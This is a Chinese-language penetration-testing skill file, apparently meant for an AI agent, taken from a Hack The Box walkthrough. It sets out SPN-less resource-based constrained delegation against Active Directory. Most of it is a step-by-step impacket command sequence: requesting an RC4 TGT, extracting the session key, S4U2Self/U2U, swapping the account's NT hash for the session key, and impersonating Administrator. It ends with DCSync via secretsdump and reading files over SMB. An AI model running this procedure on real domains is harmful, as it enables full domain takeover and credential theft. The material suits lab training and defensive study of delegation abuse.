---
name: 'rbcd-spnless'
description: 'SPN-less RBCD：发起账户无 SPN 时 getST -u2u S4U2Proxy BADOPTION 的标准解法（changepasswd -newhashes 改 NT hash = TGT session key）'
disable-model-invocation: true
metadata: { domain: ad-win, tier: T2 }
---

# SPN-less RBCD (U2U) — James Forshaw 技巧

> 来源：Hercules HTB (Insane)。当 RBCD 发起账户 **没有 SPN** 且 `getST -u2u` 的 S4U2Proxy 报 `KDC_ERR_BADOPTION` 时使用。

## 🔴 识别信号
- DC 的 `msDS-AllowedToActOnBehalfOfOtherIdentity` 包含某账户（机器/服务账户），但该账户 `servicePrincipalName` 为空
- `getST -u2u -impersonate X -spn cifs/target` → S4U2self 成功 → **S4U2Proxy BADOPTION**
- `-force-forwardable` 报 `ciphertext integrity failure`（U2U ticket 用 TGT session key 加密，force 块用长期 key 解不开）
- 账户 `userAccountControl` 无 `DONT_REQUIRE_PREAUTH`（有则 `getTGT -no-pass` 也拿不到 session key——AS-REP enc-part 用 client key 加密）

## ✅ 正确流程（核心：临时改 NT hash = TGT session key）
```bash
# 0. 前置：已重置该账户密码（如 Passw0rd@123），NT hash = <OLDHASH>
# 1. RC4 TGT（必须 RC4！AES 改不了长期 key）
impacket-getTGT -hashes :<OLDHASH> 'dom/ACCT$' -dc-ip <DC>
# 2. 提取 TGT session key（RC4 16 字节）
impacket-describeTicket 'ACCT$.ccache' | grep "Ticket Session Key"   # -> <SKEY>
# 3. S4U2Self+U2U（只 self，TGS 用 session key 加密，flags 应含 forwardable）
KRB5CCNAME=ACCT$.ccache impacket-getST -self -u2u -impersonate "Administrator" \
  -spn "cifs/dc.dom" -k -no-pass 'dom/ACCT$' -dc-ip <DC>
# 4. 临时把账户 NT hash 改成 session key（KDC 在 S4U2Proxy 用长期 RC4 key 解密 additional ticket）
KRB5CCNAME=ACCT$.ccache impacket-changepasswd 'dom/ACCT$@DC.dom' \
  -newhashes :<SKEY> -hashes :<OLDHASH> -k -no-pass -dc-ip <DC>
# 5. S4U2Proxy！additional ticket = 步骤3 的 TGS
impacket-getST -additional-ticket 'Administrator@ACCT$@DOM.ccache' \
  -impersonate "Administrator" -spn "cifs/dc.dom" -hashes :<SKEY> 'dom/ACCT$' -dc-ip <DC>
# -> Administrator@cifs_dc.dom@DOM.ccache
# 6. 立即恢复密码/hash
KRB5CCNAME=ACCT$.ccache impacket-changepasswd 'dom/ACCT$@DC.dom' \
  -newhashes :<OLDHASH> -hashes :<SKEY> -k -no-pass -dc-ip <DC>
```text

## 利用 TGS
```bash
export KRB5CCNAME='Administrator@cifs_dc.dom@DOM.ccache'
impacket-secretsdump -k -no-pass 'dom/Administrator@dc.dom' -dc-ip <DC>   # DCSync
# 读 flag：impacket-smbclient -k -no-pass 'dom/Administrator@dc.dom' -inputfile cmds.txt
#   cmds: use C$ / cd Users\Admin\Desktop / get root.txt（get 不能带本地路径参数！）
# psexec -k 可用但 stdout 不回显；wmiexec 需 HOST SPN
```text

## ⚠️ 坑
- **NTLM 禁用环境**：changepasswd/getST 全部 `-k`（Kerberos）
- **changepasswd target 必须主机名**（`@DC.dom`），不能 IP（cifs/SPN 不存在）
- **-newhashes 需要 -hashes（旧凭据）**：非 -reset 模式走 hSamrChangePasswordUser（NetUserChangePassword，自己改自己，无需管理员）
- **必须 RC4 全程**：AES TGT 时 KDC 用长期 AES key 解 additional ticket，无法通过改 hash 匹配（改密码会重派生 AES）
- **改 hash 后 TGT 仍有效**（TGT 用 krbtgt 加密，认证不查账户密码）
- 若 S4U2Self TGS 内部 flags 无 forwardable → 需 `-force-forwardable` + `-aesKey`（U2U 模式下要 patch getST.py force 块用 sessionKey）——Hercules 场景 TGS 天然 forwardable 不需此步

## 参考
- HackTricks: resource-based-constrained-delegation（"Authenticate with NT hash... changepasswd.py -newhashes"）
- NetExec Wiki delegation: `nxc smb DC --use-kcache --delegate Administrator --u2u`
- Medium "A Practical Guide to RBCD Exploitation"（U2U ticket 加密机制）
- 关联: Hercules 靶机复盘记录
